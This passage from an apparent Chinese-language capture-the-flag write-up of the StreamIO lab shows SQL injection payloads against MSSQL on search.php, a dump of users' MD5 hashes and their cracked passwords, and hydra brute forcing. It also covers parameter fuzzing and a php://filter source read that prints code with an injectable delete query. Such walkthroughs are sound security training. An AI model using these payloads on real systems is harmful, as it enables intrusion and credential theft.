class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">$ feroxbuster -u https://watch.streamio.htb -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k</span><br><span class="line"></span><br><span class="line"> ___  ___  __   __     __      __         __   ___</span><br><span class="line">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span><br><span class="line">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span><br><span class="line">by Ben <span class="string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.10.1</span><br><span class="line">───────────────────────────┬──────────────────────</span><br><span class="line"> 🎯  Target Url            │ https://watch.streamio.htb</span><br><span class="line"> 🚀  Threads               │ 50</span><br><span class="line"> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt</span><br><span class="line"> 👌  Status Codes          │ All Status Codes!</span><br><span class="line"> 💥  Timeout (secs)        │ 7</span><br><span class="line"> 🦡  User-Agent            │ feroxbuster/2.10.1</span><br><span class="line"> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml</span><br><span class="line"> 🔎  Extract Links         │ <span class="literal">true</span></span><br><span class="line"> 💲  Extensions            │ [php]</span><br><span class="line"> 🏁  HTTP methods          │ [GET]</span><br><span class="line"> 🔓  Insecure              │ <span class="literal">true</span></span><br><span class="line"> 🔃  Recursion Depth       │ 4</span><br><span class="line">───────────────────────────┴──────────────────────</span><br><span class="line"> 🏁  Press [ENTER] to use the Scan Management Menu™</span><br><span class="line">──────────────────────────────────────────────────</span><br><span class="line">404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter</span><br><span class="line">200      GET      136l      295w    22042c https://watch.streamio.htb/static/logo.png</span><br><span class="line">200      GET      192l     1006w    82931c https://watch.streamio.htb/static/icon.png</span><br><span class="line">200      GET       72l      112w      875c https://watch.streamio.htb/static/css/index.css</span><br><span class="line">200      GET       78l      245w     2829c https://watch.streamio.htb/</span><br><span class="line">200      GET       25l       34w      247c https://watch.streamio.htb/static/css/search.css</span><br><span class="line">200      GET    10837l    20418w   195704c https://watch.streamio.htb/static/css/bootstrap.css</span><br><span class="line">200      GET     7193l    19558w   253905c https://watch.streamio.htb/search.php</span><br><span class="line">301      GET        2l       10w      161c https://watch.streamio.htb/static/css =&gt; https://watch.streamio.htb/static/css/</span><br><span class="line">403      GET       29l       92w     1233c https://watch.streamio.htb/static/</span><br><span class="line">301      GET        2l       10w      160c https://watch.streamio.htb/static/js =&gt; https://watch.streamio.htb/static/js/</span><br><span class="line">301      GET        2l       10w      157c https://watch.streamio.htb/static =&gt; https://watch.streamio.htb/static/</span><br><span class="line">403      GET       29l       92w     1233c https://watch.streamio.htb/static/css/</span><br><span class="line">200      GET       78l      245w     2829c https://watch.streamio.htb/index.php</span><br><span class="line">404      GET       40l      156w     1888c https://watch.streamio.htb/con</span><br><span class="line">404      GET       40l      156w     1895c https://watch.streamio.htb/static/con</span><br><span class="line">404      GET       40l      156w     1899c https://watch.streamio.htb/static/css/con</span><br><span class="line">404      GET       40l      156w     1898c https://watch.streamio.htb/static/js/con</span><br><span class="line">200      GET       20l       47w      677c https://watch.streamio.htb/blocked.php</span><br><span class="line">404      GET       40l      156w     1888c https://watch.streamio.htb/aux</span><br><span class="line">404      GET       40l      156w     1895c https://watch.streamio.htb/static/aux</span><br><span class="line">404      GET       40l      156w     1899c https://watch.streamio.htb/static/css/aux</span><br><span class="line">404      GET       40l      156w     1898c https://watch.streamio.htb/static/js/aux</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/static/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/static/css/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/static/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/static/css/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/static/js/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/static/js/error%1F_log.php</span><br><span class="line">404      GET       40l      156w     1888c https://watch.streamio.htb/prn</span><br><span class="line">404      GET       40l      156w     1895c https://watch.streamio.htb/static/prn</span><br><span class="line">404      GET       40l      156w     1899c https://watch.streamio.htb/static/css/prn</span><br><span class="line">404      GET       40l      156w     1898c https://watch.streamio.htb/static/js/prn</span><br><span class="line">[<span class="comment">####################] - 5m    106359/106359  0s      found:34      errors:1      </span></span><br><span class="line">[<span class="comment">####################] - 5m     26584/26584   84/s    https://watch.streamio.htb/ </span></span><br><span class="line">[<span class="comment">####################] - 5m     26584/26584   84/s    https://watch.streamio.htb/static/ </span></span><br><span class="line">[<span class="comment">####################] - 5m     26584/26584   84/s    https://watch.streamio.htb/static/css/ </span></span><br><span class="line">[<span class="comment">####################] - 5m     26584/26584   84/s    https://watch.streamio.htb/static/js/</span></span><br></pre></td></tr></table></figure><p>可以找到一个<a href="https://watch.streamio.htb/search.php%E5%92%8Chttps://watch.streamio.htb/blocked.php%EF%BC%8C%E8%AE%BF%E9%97%AE/search.php%E4%B9%8B%E5%90%8E%E6%98%BE%E7%A4%BA%E7%9A%84%E6%98%AF%E4%B8%80%E4%B8%AA%E6%90%9C%E7%B4%A2%E7%95%8C%E9%9D%A2%EF%BC%8C%E4%B8%8D%E7%94%A8%E5%A4%9A%E8%AF%B4%EF%BC%8C%E5%A4%A7%E6%A6%82%E7%8E%87%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%9A">https://watch.streamio.htb/search.php和https://watch.streamio.htb/blocked.php，访问/search.php之后显示的是一个搜索界面，不用多说，大概率存在SQL注入的漏洞：</a></p><p><a href="https://pic.imgdb.cn/item/65760f16c458853aef53db73.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f16c458853aef53db73.jpg"></a></p><p>访问&#x2F;blocked.php，界面如下：</p><p><a href="https://pic.imgdb.cn/item/65760f22c458853aef53f10d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f22c458853aef53f10d.jpg"></a></p><p>提示的有可疑行为，会被block 5分钟。首先对&#x2F;search.php进行手工注入，传入<code>1&#39;  and 1=1-- -</code>和<code>1&#39;  and 1=2-- -</code>结果不同，传入<code>1&#39;  and 1=1-- -</code>和<code>1&#39;  and 2=2-- -</code>结果相同。很明显，存在盲注。之后传入<code>1&#39; and (select count(*) from sysobjects)&gt;0-- -</code>之后，页面回显正常，判断数据库为MSSQL。起初我发现xp_cmdshell是开启状态，想直接利用它执行命令，但是又发现我们的权限并不是sysadmin，所以没法利用，遂放弃。</p><p>因为禁用了order，所以我们使用<code>union select</code>来判断列数，通过在<code>union select</code>后不断添加字段数量，得到列数为6，回显点为2和3：</p><p><a href="https://pic.imgdb.cn/item/65760f3bc458853aef542183.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f3bc458853aef542183.jpg"></a></p><p>接着尝试得到数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#获取版本</span><br><span class="line">000&#x27; union select 1,(select @@version),3,4,5,6-- -</span><br><span class="line"></span><br><span class="line">Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) </span><br><span class="line">Sep 24 2019 13:48:23 </span><br><span class="line">Copyright (C) 2019 Microsoft Corporation</span><br><span class="line">Express Edition (64-bit) on Windows Server 2019 Standard 10.0 </span><br><span class="line"></span><br><span class="line">#获取当前数据库名</span><br><span class="line">000&#x27; union select 1,(select db_name()),3,4,5,6-- -</span><br><span class="line"></span><br><span class="line">STREAMIO</span><br><span class="line"></span><br><span class="line">#获取所有数据库名</span><br><span class="line">000&#x27; union select 1,(select name from master..sysdatabases for xml path),3,4,5,6-- -</span><br><span class="line"></span><br><span class="line">&lt;row&gt;&lt;name&gt;master&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;tempdb&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;model&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;msdb&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;STREAMIO&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;streamio_backup&lt;/name&gt;&lt;/row&gt;</span><br><span class="line"></span><br><span class="line">#获取表名</span><br><span class="line">000&#x27; union select 1,(select name from STREAMIO..sysobjects where xtype=&#x27;u&#x27; for xml path),3,4,5,6-- -</span><br><span class="line"></span><br><span class="line">&lt;row&gt;&lt;name&gt;movies&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;users&lt;/name&gt;&lt;/row&gt;</span><br><span class="line"></span><br><span class="line">#获取users表中的列名</span><br><span class="line">000&#x27; union select 1,(select name from STREAMIO..syscolumns where id=(select max(id) from STREAMIO..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;) for xml path),3,4,5,6-- -</span><br><span class="line"></span><br><span class="line">&lt;row&gt;&lt;name&gt;id&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;is_staff&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;password&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;username&lt;/name&gt;&lt;/row&gt;</span><br><span class="line"></span><br><span class="line">#获取username和password</span><br><span class="line">000&#x27; union select 1,(select username,password from STREAMIO..users for xml path),3,4,5,6-- -</span><br><span class="line"></span><br><span class="line">James c660060492d9edcaa8332d89c99c9239 Theodore 925e5408ecb67aea449373d668b7359e Samantha 083ffae904143c4796e464dac33c1f7d Lauren 08344b85b329d7efd611b7a7743e8a09 William d62be0dc82071bccc1322d64ec5b6c51 Sabrina f87d3c0d6c8fd686aacc6627f1f493a5 Robert f03b910e2bd0313a23fdd7575f34a694 Thane 3577c47eb1e12c8ba021611e1280753c Carmon 35394484d89fcfdb3c5e447fe749d213 Barry 54c88b2dbd7b1a84012fabc1a4c73415 Oliver fd78db29173a5cf701bd69027cb9bf6b Michelle b83439b16f844bd6ffe35c02fe21b3c0 Gloria 0cfaaaafb559f081df2befbe66686de0 Victoria b22abb47a02b52d5dfa27fb0b534f693 Alexendra 1c2b3d8270321140e5153f6637d3ee53 Baxter 22ee218331afd081b0dcd8115284bae3 Clara ef8f3d30a856cf166fb8215aca93e9ff Barbra 3961548825e3e21df5646cafe11c6c76 Lenord ee0b8a0937abd60c2882eacb2f8dc49f Austin 0049ac57646627b8d7aeaccf8b6a936f Garfield 8097cedd612cc37c29db152b6e9edbd3 Juliette 6dcd87740abb64edfa36d170f0d5450d Victor bf55e15b119860a6e6b5a164377da719 Lucifer 7df45a9e3de3863807c026ba48e55fb3 Bruno 2a4e2cf22dd8fcb45adcb91be1e22ae8 Diablo ec33265e5fc8c2f1b0c137bb7b3632b5 Robin dc332fb5576e9631c9dae83f194f8e70 Stan 384463526d288edcc95fc3701e523bc7 yoshihide b779ba15cedfd22a023c4d8bcf5f2332 admin 665a50ac9eaa781e4f7f04199db97a11</span><br></pre></td></tr></table></figure><p>得到了一批密码，使用hash-identifier检验之后，发现密码是使用md5算法生成。</p><p><a href="https://pic.imgdb.cn/item/65760f47c458853aef5434e6.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f47c458853aef5434e6.jpg"></a></p><p>接下来尝试对这批密码进行解密，但是解密之前我们需要对我们的数据进行一些处理。比如将username都储存在一个文件里，然后password都储存在一个文件里，以及按照<code>username:password</code>的格式再生成一个文件。为此，我写了个小脚本来帮我完成这件事情：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;James c660060492d9edcaa8332d89c99c9239 Theodore 925e5408ecb67aea449373d668b7359e Samantha 083ffae904143c4796e464dac33c1f7d Lauren 08344b85b329d7efd611b7a7743e8a09 William d62be0dc82071bccc1322d64ec5b6c51 Sabrina f87d3c0d6c8fd686aacc6627f1f493a5 Robert f03b910e2bd0313a23fdd7575f34a694 Thane 3577c47eb1e12c8ba021611e1280753c Carmon 35394484d89fcfdb3c5e447fe749d213 Barry 54c88b2dbd7b1a84012fabc1a4c73415 Oliver fd78db29173a5cf701bd69027cb9bf6b Michelle b83439b16f844bd6ffe35c02fe21b3c0 Gloria 0cfaaaafb559f081df2befbe66686de0 Victoria b22abb47a02b52d5dfa27fb0b534f693 Alexendra 1c2b3d8270321140e5153f6637d3ee53 Baxter 22ee218331afd081b0dcd8115284bae3 Clara ef8f3d30a856cf166fb8215aca93e9ff Barbra 3961548825e3e21df5646cafe11c6c76 Lenord ee0b8a0937abd60c2882eacb2f8dc49f Austin 0049ac57646627b8d7aeaccf8b6a936f Garfield 8097cedd612cc37c29db152b6e9edbd3 Juliette 6dcd87740abb64edfa36d170f0d5450d Victor bf55e15b119860a6e6b5a164377da719 Lucifer 7df45a9e3de3863807c026ba48e55fb3 Bruno 2a4e2cf22dd8fcb45adcb91be1e22ae8 Diablo ec33265e5fc8c2f1b0c137bb7b3632b5 Robin dc332fb5576e9631c9dae83f194f8e70 Stan 384463526d288edcc95fc3701e523bc7 yoshihide b779ba15cedfd22a023c4d8bcf5f2332 admin 665a50ac9eaa781e4f7f04199db97a11&quot;</span></span><br><span class="line">a = a.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">f_user = <span class="built_in">open</span>(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">f_pass = <span class="built_in">open</span>(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">f_uap = <span class="built_in">open</span>(<span class="string">&quot;userpass&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        f_user.write(a[i] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        f_uap.write(a[i] + <span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f_pass.write(a[i] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        f_uap.write(a[i] + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">f_uap.close()</span><br><span class="line">f_user.close()</span><br><span class="line">f_pass.close()</span><br></pre></td></tr></table></figure><p>接下来使用hashcat对密码进行破解：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─<span class="comment"># hashcat userpass /usr/share/wordlists/rockyou.txt --username -m 0 --show</span></span><br><span class="line">Lauren:08344b85b329d7efd611b7a7743e8a09:<span class="comment">##123a8j8w5123##</span></span><br><span class="line">Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$</span><br><span class="line">Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical</span><br><span class="line">Barry:54c88b2dbd7b1a84012fabc1a4c73415:<span class="variable">$hadoW</span></span><br><span class="line">Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123</span><br><span class="line">Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!</span><br><span class="line">Clara:ef8f3d30a856cf166fb8215aca93e9ff:%<span class="variable">$clara</span></span><br><span class="line">Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i</span><br><span class="line">Juliette:6dcd87740abb64edfa36d170f0d5450d:<span class="variable">$3xybitch</span></span><br><span class="line">Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$</span><br><span class="line">yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..</span><br><span class="line">admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd</span><br></pre></td></tr></table></figure><p>继续对该结果进行处理，将username都储存在一个文件里，将已破解的password都储存在一个文件里，以及按照<code>username:password</code>的格式再生成一个文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hashcat userpass /usr/share/wordlists/rockyou.txt --username -m 0 --show &gt; tmp</span><br><span class="line"><span class="built_in">cat</span> tmp |awk -F : <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; cracked_username</span><br><span class="line"><span class="built_in">cat</span> tmp |awk -F : <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> &gt; cracked_password</span><br><span class="line"><span class="built_in">cat</span> tmp |awk -F : -v OFS=<span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print $1,$3&#125;&#x27;</span> &gt; cracked_userpass</span><br></pre></td></tr></table></figure><p>因为我们拿到的是STREAMIO的users数据库，可以猜测出这应该可以用于<code>https://streamio.htb</code>的登录。但是随便用了一批账户密码没登进去，那试试爆破一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─<span class="comment"># hydra -C cracked_userpass streamio.htb https-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:Failed&quot;             </span></span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-10 11:35:12</span><br><span class="line">[DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries, ~1 try per task</span><br><span class="line">[DATA] attacking http-post-forms://streamio.htb:443/login.php:username=^USER^&amp;password=^PASS^:Failed</span><br><span class="line">[443][http-post-form] host: streamio.htb   login: yoshihide   password: 66boysandgirls..</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-10 11:35:14</span><br></pre></td></tr></table></figure><p>得到了一对可用的账号密码：<code>yoshihide:66boysandgirls..</code>。接下来登录之后，访问之前爆破出的&#x2F;admin目录：</p><p><a href="https://pic.imgdb.cn/item/65760f55c458853aef54499a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f55c458853aef54499a.jpg"></a></p><p>是一个管理员面板。经过观察，发现GET传入的参数不同，会转到不同的页面：</p><p><a href="https://pic.imgdb.cn/item/65760f5fc458853aef545dce.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f5fc458853aef545dce.jpg"></a></p><p>但是尝试将这些参数的值改成之前得到的master.php之后，并未得到任何结果。因此可以尝试参数爆破，看看是否存在我们隐藏界面，以下是爆破的结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wfuzz -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt -c -u https://streamio.htb/admin/?FUZZ= -H &quot;Cookie: PHPSESSID=puqalerh2km91i9t6p5aa0qggq&quot;  --hw 131</span></span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: https://streamio.htb/admin/?FUZZ=</span></span><br><span class="line"><span class="string">Total requests: 6453</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string">ID           Response   Lines    Word       Chars       Payload                                                                                                                   </span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">000001575:   200        49 L     137 W      1712 Ch     &quot;debug&quot;                                                                                                                   </span></span><br><span class="line"><span class="string">000003530:   200        10790    25878 W    320235 Ch   &quot;movie&quot;                                                                                                                   </span></span><br><span class="line"><span class="string">                        L                                                                                                                                                         </span></span><br><span class="line"><span class="string">000005450:   200        398 L    916 W      12484 Ch    &quot;staff&quot;                                                                                                                   </span></span><br><span class="line"><span class="string">000006133:   200        62 L     160 W      2073 Ch     &quot;user&quot;                                                                                                                    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Total time: 76.33917</span></span><br><span class="line"><span class="string">Processed Requests: 6453</span></span><br><span class="line"><span class="string">Filtered Requests: 6449</span></span><br><span class="line"><span class="string">Requests/sec.: 84.53064</span></span><br></pre></td></tr></table></figure><p>可以看到，还存在一个debug参数，我们访问之后，结果如下：</p><p><a href="https://pic.imgdb.cn/item/65760f6bc458853aef547ee9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f6bc458853aef547ee9.jpg"></a></p><p>可以看到，这里提示我们此选项仅供开发者使用。我们将debug的值设为master.php之后，发现又出现了movie、staff以及user的管理界面的详情。尝试php伪协议读一下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://streamio.htb/admin/?debug=php://filter/read=convert.base64-encode/resource=master.php</span><br></pre></td></tr></table></figure><p>将得到的结果base64解码后，得到master.php的源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;Movie managment&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;included&#x27;</span>))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Only accessable through includes&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;movie_id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;delete from movies where id = &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;movie_id&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">sqlsrv_query</span>(<span class="variable">$handle</span>, <span class="variable">$query</span>, <span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">&quot;Scrollable&quot;</span>=&gt;<span class="string">&quot;buffered&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select * from movies order by movie&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">sqlsrv_query</span>(<span class="variable">$handle</span>, <span class="variable">$query</span>, <span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">&quot;Scrollable&quot;</span>=&gt;<span class="string">&quot;buffered&quot;</span>));</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">sqlsrv_fetch_array</span>(<span class="variable">$res</span>, SQLSRV_FETCH_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>: 3<span class="title">rem</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h4</span> <span class="title">style</span>=&quot;<span class="title">float</span>:<span class="title">left</span>;&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">movie</span>&#x27;]; ?&gt;&lt;/<span class="title">h4</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">style</span>=&quot;<span class="title">float</span>:<span class="title">right</span>;<span class="title">padding</span>-<span class="title">right</span>: 25<span class="title">px</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">action</span>=&quot;?<span class="title">movie</span>=&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span 